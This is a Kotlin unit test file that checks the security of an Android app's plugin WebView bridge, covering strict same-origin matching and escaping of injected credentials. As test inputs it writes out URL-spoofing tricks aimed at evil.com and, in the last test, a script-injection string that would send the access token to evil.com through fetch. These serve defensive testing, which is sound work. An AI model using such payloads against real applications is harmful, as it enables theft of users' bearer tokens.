package com.raulshma.jellyplay.feature.admin.plugins

import kotlin.test.Test
import kotlin.test.assertEquals
import kotlin.test.assertFalse
import kotlin.test.assertTrue

/**
 * Pins the security contract of the plugin-config WebView bridge halves
 * (`PluginBridgeScript.kt`):
 *
 *  - [isSameOrigin] compares scheme + host + port as parsed URI components,
 *    never a string prefix. The two documented attacks — the
 *    `https://server.evil.com` suffix-append and the
 *    `http://server:8096@evil.com` userinfo trick — must both return false,
 *    otherwise a malicious plugin page could ride the injected bearer token.
 *  - Any parse failure or non-strict-origin match returns false so the caller
 *    lets the WebView handle the request unauthenticated.
 *  - [buildBridgeScript] substitutes every `__TOKEN__` placeholder and passes
 *    each value through the JS string escaper, so a hostile token / user id /
 *    server address cannot break out of the string literal in
 *    `pluginBridge.js` (jsEscape itself is private; it is exercised through
 *    buildBridgeScript).
 *
 * The same-scheme-ftp-vs-ftp style edge is deliberately NOT pinned: the
 * production serverAddress is always http(s), and the guard against non-http
 * schemes comes from the scheme comparison against that address.
 */
class PluginBridgeScriptTest {

    private val server = "http://server:8096"

    // ── isSameOrigin: happy paths ──

    @Test
    fun `identical urls are same origin`() {
        assertTrue(isSameOrigin(server, server))
    }

    @Test
    fun `host comparison is case-insensitive`() {
        assertTrue(isSameOrigin("http://SERVER:8096/path", server))
        assertTrue(isSameOrigin(server, "HTTP://server:8096"))
    }

    @Test
    fun `explicit port matches the IANA default of the scheme`() {
        assertTrue(isSameOrigin("https://server", "https://server:443"))
        assertTrue(isSameOrigin("http://server:80/x", "http://server"))
    }

    @Test
    fun `path query and fragment differences are ignored`() {
        assertTrue(isSameOrigin("http://server:8096/Web/index.html?a=1#f", server))
        assertTrue(isSameOrigin(server, "http://server:8096/"))
    }

    // ── isSameOrigin: strict-origin rejections ──

    @Test
    fun `different port is rejected`() {
        assertFalse(isSameOrigin("http://server:8920", server))
        assertFalse(isSameOrigin("http://server", server))
    }

    @Test
    fun `scheme mismatch is rejected`() {
        assertFalse(isSameOrigin("https://server:8096", server))
        assertFalse(isSameOrigin("http://server", "https://server"))
    }

    @Test
    fun `suffix-append attack is rejected`() {
        // A plain startsWith check would exfiltrate the token to evil.com.
        assertFalse(isSameOrigin("https://server.evil.com", "https://server"))
        assertFalse(isSameOrigin("http://server:8096.evil.com", server))
    }

    @Test
    fun `userinfo trick is rejected`() {
        // URI parses this as host=evil.com (userinfo=server:8096) — must not
        // match the real server even if the port looks right.
        assertFalse(isSameOrigin("http://server:8096@evil.com", server))
        assertFalse(isSameOrigin("http://server@evil.com:80", "http://server"))
    }

    @Test
    fun `malformed urls are rejected`() {
        // java.net.URI throws on the space in the host — runCatching must
        // swallow it into a false, not propagate.
        assertFalse(isSameOrigin("http://exa mple.com", server))
        assertFalse(isSameOrigin(server, "http://exa mple.com"))
    }

    @Test
    fun `non-http schemes are rejected against an http server address`() {
        assertFalse(isSameOrigin("file:///etc/passwd", server))
        assertFalse(isSameOrigin("wss://server:8096", server))
        assertFalse(isSameOrigin("ftp://server:8096", server))
    }

    @Test
    fun `empty host is rejected`() {
        assertFalse(isSameOrigin("http:///etc/passwd", server))
    }

    // ── buildBridgeScript: token substitution ──

    private val template =
        "var cfg={s:\"__SERVER_ADDRESS__\",u:\"__USER_ID__\",t:\"__ACCESS_TOKEN__\"};"

    @Test
    fun `all placeholders are substituted`() {
        val script = buildBridgeScript(
            pluginBridgeJs = template,
            serverAddress = "https://media.example.com",
            userId = "user-1",
            accessToken = "tok-1",
        )
        assertEquals(
            "var cfg={s:\"https://media.example.com\",u:\"user-1\",t:\"tok-1\"};",
            script,
        )
        assertFalse(script.contains("__SERVER_ADDRESS__"))
        assertFalse(script.contains("__USER_ID__"))
        assertFalse(script.contains("__ACCESS_TOKEN__"))
    }

    // ── buildBridgeScript: jsEscape behavior (via the injected tokens) ──

    @Test
    fun `plain values pass through unescaped`() {
        val script = buildBridgeScript(template, "https://host:8920", "abc123", "token/+=._-")
        assertTrue(script.contains("s:\"https://host:8920\""))
        assertTrue(script.contains("u:\"abc123\""))
        assertTrue(script.contains("t:\"token/+=._-\""))
    }

    @Test
    fun `double quotes are escaped`() {
        val script = buildBridgeScript(template, "host", "user", "say \"hi\"")
        assertTrue(script.contains("t:\"say \\\"hi\\\"\""))
    }

    @Test
    fun `backslashes are escaped`() {
        val script = buildBridgeScript(template, "C:\\path", "user", "tok")
        assertTrue(script.contains("s:\"C:\\\\path\""))
    }

    @Test
    fun `newline and carriage return are escaped to literal sequences`() {
        val script = buildBridgeScript(template, "a\nb", "c\rd", "tok")
        assertTrue(script.contains("s:\"a\\nb\""))
        assertTrue(script.contains("u:\"c\\rd\""))
        // The output must stay a single JS line: no raw control characters.
        assertFalse(script.contains('\n'))
        assertFalse(script.contains('\r'))
    }

    @Test
    fun `tab is escaped`() {
        val script = buildBridgeScript(template, "a\tb", "user", "tok")
        assertTrue(script.contains("s:\"a\\tb\""))
    }

    @Test
    fun `control characters are escaped to lowercase unicode sequences`() {
        val script = buildBridgeScript(template, "\u0001", "\u001B", "\u007f")
        // C0 controls below 0x20 become \uXXXX (zero-padded, lowercase hex)…
        assertTrue(script.contains("s:\"\\u0001\""))
        assertTrue(script.contains("u:\"\\u001b\""))
        // …while DEL (0x7f) is not below 0x20 and passes through raw.
        assertTrue(script.contains("t:\"\u007f\""))
        assertFalse(script.contains("\\u007f"))
    }

    @Test
    fun `a hostile token cannot break out of the string literal`() {
        val hostile = "\";} fetch('https://evil.com?t='+__ACCESS_TOKEN__);//"
        val script = buildBridgeScript(template, "host", "user", hostile)
        // Every quote and backslash escaped → the payload stays inert inside
        // the token literal.
        assertTrue(script.contains("t:\"\\\";} fetch('https://evil.com?t='+__ACCESS_TOKEN__);//\""))
    }
}
